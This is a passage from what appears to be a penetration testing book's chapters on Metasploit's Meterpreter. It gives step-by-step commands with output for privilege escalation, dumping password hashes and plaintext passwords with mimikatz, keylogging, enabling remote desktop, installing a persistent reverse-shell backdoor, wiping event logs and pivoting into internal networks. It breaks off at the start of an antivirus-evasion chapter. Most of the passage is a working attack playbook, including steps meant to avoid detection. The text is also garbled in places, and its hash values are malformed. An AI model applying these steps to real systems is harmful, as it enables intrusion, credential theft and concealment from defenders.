    information, the screen of the target host was successfully intercepted and saved
    to the/root/example.jpeg file. At this time, the user can view the screenshot
    to confirm the operation performed by the target user.As you can see from the
    screenshot, the target user is browsing the CSDN blog webpage.Enumerate usersA
    penetration tester can also use the run post/windows/gather/enum_logged_on_user
    command to enumerate users on the target host.The execution command is as follows:
    ￼meterpreter> run post/windows/gather/enum_logged_on_users￼From the output information,
    you can see that there is only one user on the target host, and the user name
    is Administrator.Privilege escalationIn some cases, the Meterpreter session obtained
    by the user will be restricted by the user''s permissions, which will affect the
    operation of the penetration tester in the target system, such as modifying the
    registry, installing a backdoor, or exporting passwords. At this point, the user
    can use the getsystem command to escalate the rights of the current user. The
    following will introduce how to elevate user permissions.Raise the rights of ordinary
    users. First check the permission information of the current user.The execution
    command is as follows: ￼meterpreter> getuid￼ Server username: exampleserver-PC\bobFrom
    the output information, we can see that the current user is a normal user, whose
    user name is bob. Next, the user will bePromote rights.The execution command is
    as follows: ￼meterpreter> getsystem￼Seeing the above output information, it means
    that the current user has been successfully escalated. At this point, check the
    user permissions again.The results are as follows: ￼meterpreter> getuid￼ Server
    username: NT AUTHORITY\SYSTEMFrom the output information, you can see that the
    current user''s authority is NT AUTHORITY\SYSTEM. This shows that the user''s
    authority has been successfully elevated.Get user passwordWhen the meterpreter
    session obtained by the user has certain permissions, the user password can be
    obtained. The following will use the hashdump command to obtain the user''s password.The
    execution command is as follows:meterpreter> hashdump￼ Administrator: 500:From
    the output information, we can see that there are 3 users in the target host,
    namely Administrator, bob and Guest.The format of the above output information
    is username: SID: LM hash: NTLM hash. Among them, the LM hash ccd3b653b51404 eeaad3b653b51404ee
    and the NTLM hash 31d6ccy0d16ae981b23c89d7e0c045c0 correspond to an empty password.The
    hashed password obtained using the hashdump command requires further cracking
    to get the real password. At this point, the user can also obtain the user password
    by loading the mimikatz module. However, the commands of this module are only
    for 32-bit systems. The following will introduce how to use mimikatz module to
    obtain user password.The specific steps are as follows:1) Load the mimikatz module.The
    execution command is as follows: ￼meterpreter> load mimikatz￼Seeing the above
    output information, it means that the mimikatz module has been successfully loaded.
    At this point, you can use the help mimikatz command to view all the commands
    supported by the mimikatz module. details as follows:meterpreter> help mimikatz￼From
    the above output, you can see all the commands supported by the mimikatz module.
    Next, we will introduce how to use these commands to obtain user passwords.2)
    Use the mimikatz_command command to obtain the user password.The execution command
    is as follows: ￼meterpreter> mimikatz_command -fFrom the output information, we
    can see that the passwords of the Administrator and bob users have been successfully
    obtained. Among them, the passwords of these two users are lyw520!.3) Use the
    msv command to obtain the user''s hash password.The execution command is as follows:
    ￼meterpreter> msv￼From the information output above, we can see that the user
    hash password is successfully obtained.4) Use the wdigest command to obtain the
    plaintext password stored in the memory of the logged-in user.The execution command
    is as follows: ￼meterpreter> wdigest￼From the output information, you can see
    the clear text password of the logged-in user.Chapter 33Binding an exploit using
    Metasploit![](Image00006.jpg)Binding processMeterpreter can run alone or bind
    with other processes. When Meterpreter runs as a process alone, it is easy to
    find. If you bind it to a process that runs frequently in the system, you can
    achieve persistence. The method of binding the process will be introduced below.Bind
    the process and capture the keyboard records.1) View the processes running in
    the current system.The execution command is as follows: ￼meterpreter> ps￼As you
    can see from the output information, all processes running in the current system
    are displayed. The output information includes 7 columns, which respectively represent
    PID (process ID), PPID (parent ID), Name (process name), Arch (architecture),
    Session (session), User (user name) and Path (path). For example, here will choose
    Meterpreter to bind with winlogon.exe process. Among them, the process ID is 400.2)
    Use the getpid command to view the current process ID.The execution command is
    as follows: ￼meterpreter> getpid￼Current pid: 1096From the output information,
    you can see that the current process ID is 1096.3) Use the migrate command to
    bind the process.The execution command is as follows: ￼meterpreter> migrate 400￼[＊]
    Migrating from 1096 to 400...￼[＊] Migration completed successfully.From the output
    information, we can see that the process was successfully migrated to 400.4) Start
    and capture keyboard data.The execution command is as follows: ￼meterpreter> keyscan_start#Start
    keyboard capture ￼ exampleserverFrom the output information, you can see that
    the user entered exampleserver and pressed the Enter key. This shows that the
    user password exampleserver may have been entered.Run the programIn Meterpreter,
    penetration testers can also use the execute command to execute applications on
    the target system.The syntax format of this command is as follows: ￼execute [options]
    -f commandThe execution command is as follows: ￼meterpreter> execute -s 1-f cmd￼Process
    2260 created.As you can see from the output information, a process with ID 2260
    was created. At this point, you can see the started CMD program on the target
    host. ￼Enable remote desktopIn Meterpreter, users can also start a remote desktop
    to connect to the target host remotely. The following describes how to enable
    remote desktop and log in remotely.The execution command is as follows: ￼meterpreter>
    run post/windows/manage/enable_rdp￼Seeing the above output information indicates
    that the remote desktop has been successfully started. Next, the user also needs
    to check the idle time of the remote user.The execution command is as follows:
    ￼meterpreter> idletime￼User has been idle for: 23 days 7 hours 16 mins 52 secsIt
    can be seen from the output information that the user’sThe idle time is 23 days,
    7 hours, 16 minutes and 52 seconds. Next, the penetration tester can remotely
    access the desktop of the target host.The user can obtain the username and password
    of the target host through some methods, such as hashdump command and mimikatz
    module. At this point, the user can use the obtained user information to remotely
    connect to the target host in the Kali host.The following will use the rdesktop
    command to connect to the desktop remotely.1) The execution command is as follows:
    ￼root@exampleserver:～# rdesktop 192.168.29.143After executing the above command,
    a remote desktop will open. ￼2) Select the logged-in user on this interface to
    log in to the target host. Select the "other users" option here, and the interface
    will be displayed. ￼3) Enter the user name and password for remote login in this
    interface. Then, click the login button ￼, you can successfully connect to the
    remote desktop. ￼ From this interface, you can see that you have successfully
    connected to the remote desktop of the target host.Chapter 34Persistent Backdoor![](Image00006.jpg)After
    successfully obtaining access to the target system, the penetration tester certainly
    does not want to regain access in the same laborious way. Since Meterpreter is
    a connection established based on a memory DLL, as long as the target host is
    shut down, the Meterpreter connection will be disconnected.Therefore, in order
    to facilitate subsequent penetration testing, a durable backdoor can be created.
    In this way, as long as the target host is powered on, it will automatically establish
    a connection with the attacking host. Moreover, when a persistent backdoor is
    created, even if the connection is interrupted, it will not affect the work. The
    following will introduce the use of run persistence command to create a persistent
    backdoor.Among them, the syntax format is as follows: ￼run persistence -X -i -p
    -rUse the run persistence command to create a persistent backdoor.The execution
    command is as follows: ￼meterpreter> run persistence -X -i 5-p 8888192.168.29.134￼From
    the output information, we can see that an executable script is created in the
    target host. Among them, the script file name is MIknXebtV.vbs. At this point,
    the user can see the file in the C:\Windows\TEMP directory of the target host.
    ￼After the user creates a persistent backdoor on the target host, it also needs
    to establish a listener locally. In this way, when the target host restarts, it
    can automatically establish a connection with the attacking host. The following
    will use the exploit/multi/handler module to establish a monitor.1) Select the
    exploit/multi/handler module.The execution command is as follows: ￼msf5> use exploit/multi/handler￼
    msf5 exploit(multi/handler)>2) Load the attack payload and view the configuration
    options.The execution command is as follows: ￼msf5 exploit(multi/handler)> set
    payload windows/meterpreter/reverse_tcp￼As you can see from the output information,
    the required item LHOST has not been configured yet. Moreover, the port monitored
    by this module is 4444\. Since port 4444 has been monitored before, we will modify
    another monitoring port, such as 8888.3) Configure attack payload options.The
    execution command is as follows: ￼msf5 exploit(multi/handler)> set LHOST 192.168.29.134￼
    LHOST => 192.168.29.134￼ msf5 exploit(multi/handler)> set LPORT 8888￼ LPORT =>
    88884) Establish monitoring.The execution command is as follows: ￼msf5 exploit(multi/handler)>
    exploit￼[＊] Started reverse TCP handler on 192.168.29.134:8888From the output
    information, we can see that the current host is listening on port 8888 and the
    IP address is 192.168.29.134.5) When the target host restarts, it will actively
    establish a connection with the attacking host. as follows: ￼[＊] Sending stage
    (179779 bytes) to 192.168.29.143￼From the output information, we can see that
    a Meterpreter session was successfully opened.Clear traceWhen the penetration
    tester invades the target host, all operations will be recorded in the log file
    of the target system. Therefore, in order not to be discovered by the target system,
    it is very important to clear the trace. At this point, the user can use the clearev
    command to clear the trace.The execution command is as follows:meterpreter> clearev￼You
    can see the cleared related records from the output information. Among them, 90
    application records, 681 system records and 191 security records were cleared.Build
    a springboardSpringboard refers to using a vulnerable host that has been attacked
    as a springboard to penetrate other hosts in the network. It can also be used
    to infiltrate intranet systems that cannot be directly accessed due to routing
    issues. The method of building a springboard will be introduced below.The specific
    steps are as follows:1) Open the obtained Meterpreter session.The execution command
    is as follows: ￼[＊] Meterpreter session 1 opened (192.168.2.10:4444-> 192.168.1.10:1051)￼
    at 2019-04-17 15:56:24 +0800￼ meterpreter>From the addresses of the above session,
    you can see that the address of the attacking host is 192.168.2.10, and the address
    of the target host is 192.168.1.10\. Obviously the two hosts do not belong to
    the same network. Therefore, if you want to infiltrate other hosts in the network
    where the target host is located, you need to add corresponding routing entries
    to achieve this.2) Check the subnet on the target system.The execution command
    is as follows: ￼meterpreter> run get_local_subnets￼From the output information,
    you can see that the subnet where the target system is located is 192.168.1.0/24.3)
    Put the attack session to run in the background and add routing entries. Among
    them, the syntax format of adding a route entry is as follows: ￼ route add [subnet][mask]
    [session ID]Add routing entries.The execution command is as follows: ￼meterpreter>
    background [＊ ] Route addedFrom the output information, you can see that a routing
    entry was successfully added. At this point, the user can use the route print
    command to view the added route entries. as follows:msf5 exploit(handler)> route
    print￼ From the output information, you can see that the route entry of 192.168.1.0/24
    has been successfully added. Next, the attacking host can infiltrate other hosts
    in the 192.168.1.0/24 network.Tip: In the above example, use the route add command
    to add a route to the attack session of Meterpreter. If you want to complete this
    operation more automatically, you can choose to use the load auto_add_route command.
    as follows: ￼msf5 exploit(handler)> load auto_add_route￼[＊] Successfully loaded
    plugin: auto_add_routeFrom the output information, you can see that the auto_add_route
    plugin was successfully loaded. Next, use the exploit command to perform penetration
    testing on other hosts. as follows: ￼msf5 exploit(handler)> exploit ￼Chapter 35Anti-kill
    Payload attack![](Image00006.jpg)Kali Linux provides a tool called Veil Evasion,
